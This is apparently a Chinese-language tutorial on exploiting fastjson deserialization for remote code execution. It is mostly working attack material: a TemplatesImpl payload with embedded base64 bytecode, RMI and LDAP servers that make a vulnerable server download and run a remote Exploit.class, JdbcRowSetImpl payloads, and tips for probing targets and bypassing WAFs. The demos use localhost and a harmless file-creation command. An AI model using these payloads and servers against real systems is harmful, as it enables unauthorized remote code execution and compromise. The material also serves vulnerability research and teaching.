
## 0x00 fastjson漏洞简介
1.parseObject函数导致反序列化执行命令原始利用@type特性构造函数User()或者setter()函数可控的条件下才能触发，如下表达式text可控,这个表达式在实战中应用很少。
`JSON.parseObject(text,Object.class);`

2.后来研究人员发现TemplatesImpl可利用完成攻击，利用条件比较苛刻.
默认fastjson只会反序列化公开的属性和域而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化，也就是如下text1可控
`Object obj2 = JSON.parseObject(text1,Feature.SupportNonPublicField);`

3.利用rmi、ldap实现攻击,可控代码`JSON.parse(code)`利用场景较多。
## 0x01基于TemplatesImpl攻击演示

以下为漏洞代码基于spring mvc
```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
@Controller
public class fastjsonController {

    @RequestMapping(value = "/fastjson", method = RequestMethod.POST)
    public String testVuln(@RequestParam(value = "code") String code) {
        JSONObject obj = JSON.parseObject(code, Feature.SupportNonPublicField);
        return "home";
    }
}
}
```
Poc.java
```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class poc extends AbstractTranslet {
    public poc() throws IOException {
        Runtime.getRuntime().exec("touch /tmp/xxoo");
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {

    }

    public static void main(String[] args) throws Exception {
        poc t = new poc();
    }
```

先编译`javac poc.java`然后base64编码poc.class 发送payload
```bash
code=%7B%22@type%22%3A%22com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl%22%2C%22_bytecodes%22%3A%5B%22yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ%2bAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAIcG9jLmphdmEMAAgACQcAIQwAIgAjAQAPdG91Y2ggL3RtcC94eG9vDAAkACUBAANwb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACgAEAAsADQAMAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEAABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFQAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGAAIABkADAAAAAQAAQAUAAEAFQAAAAIAFg%3D%3D%22%5D%2C%27_name%27%3A%27a.b%27%2C%27_tfactory%27%3A%7B%20%7D%2C%22_outputProperties%22%3A%7B%20%7D%2C%22_name%22%3A%22a%22%2C%22_version%22%3A%221.0%22%2C%22allowedProtocols%22%3A%22all%22%7D%22%3B
```
## 0x02利用JNDI攻击掩饰
个人觉得这种方法比较好，可以过waf也方便检测漏洞但是对jdk版本有要求，测试了好久一直没有成功。后来发现jdk版本问题8u121以下版本就可以。8u121版本默认加了 trustURLCodebase限制了利用。本地开启JNDIserver监听1022，然后请求http://localhost:8888/ 加载运行Exploti.class文件
```java
package server;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

class JNDIServer {
    public static void start() throws AlreadyBoundException, RemoteException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1022);
        Reference reference = new javax.naming.Reference("Exploit","Exploit","http://localhost:8888/");
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
        registry.bind("Exploit", referenceWrapper);
    }
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        start();
    }
}
```
Exploit.java 代码如下，执行`javac Exploit.java`命令 编译成class文件 放在自己的web目录
```
public class Exploit {
    public Exploit(){
        try{
            Runtime.getRuntime().exec("touch /tmp/aass");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }

```
漏洞代码如下
```java
package com.fastjson.test;
import com.alibaba.fastjson.JSON;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class HelloController {

    @RequestMapping("/hello")
    public String hello(Model model) {
        model.addAttribute("message", "hello, world");
        System.out.println("ssss");
        return "home";
    }
    @RequestMapping("/fastjson")
    public String fastjson( Model model,@RequestParam(value = "code") String code){
//        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1022/Exploit\",\"autoCommit\":true}";
        JSON.parse(code);
        System.out.println("xxx");
        return "home";
    }

```
发送
```bash
http://127.0.0.1:8080/fastjson?code=%7B%22@type%22%3A%22com.sun.rowset.JdbcRowSetImpl%22%2C%22dataSourceName%22%3A%22rmi%3A%2f%2f127.0.0.1%3A1022%2fExploit%22%2C%22autoCommit%22%3Atrue%7D
```

利用工具marshalsec
```
git clone https://github.com/mbechler/marshalsec.git
mvn clean package -DskipTests
```
## 0x03 利用ldap攻击演示
目前不受jdk版本控制,套路和利用哦那个rmi相同
ldapserver.java
```java
package server;

import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;


/**
 * LDAP server implementation returning JNDI references
 *
 * @author mbechler
 *
 */
public class LDAPServer{

    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main ( String[] args ) {


        int port = 1388;
        String url="http://127.0.0.1:8888/#Exploit";
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;


        /**
         *
         */
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }


        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }


        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```
本地搭建web 端口8888里面放编译好的文件名为Exploit.class文件。加载执行，漏洞利用代码跟rmi相同，payload如下
```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1388/Exploit", "autoCommit":true}

http://127.0.0.1:8080/fastjson?code=%7B%22@type%22%3A%22com.sun.rowset.JdbcRowSetImpl%22%2C%22dataSourceName%22%3A%22ldap%3A%2f%2f127.0.0.1%3A1388%2fExploit%22%2C%20%22autoCommit%22%3Atrue%7D%0A
```
## 0x04 技巧
1.通过提交错误的序列化字符串进行报错判断

```
Type Exception Report

Message Request processing failed; nested exception is com.alibaba.fastjson.JSONException: set property error, outputProperties

Description The server encountered an unexpected condition that prevented it from fulfilling the request.

Exception
```

2.通过 rmi或者ldap判断漏洞是否存在

`{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://127.0.0.1:1122/Object","autoCommit":true}`
本地监听
```
➜  /tmp nc -l 1122
JRMIK
```


3.bp抓包查看时候有序列化数据，尝试payload
```
{"name":{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://127.0.0.1:1122/Object","autoCommit":true},"age":12}
```
相关代码如下


参考文章

https://www.cnblogs.com/mrchang/p/6789060.html
http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/
http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/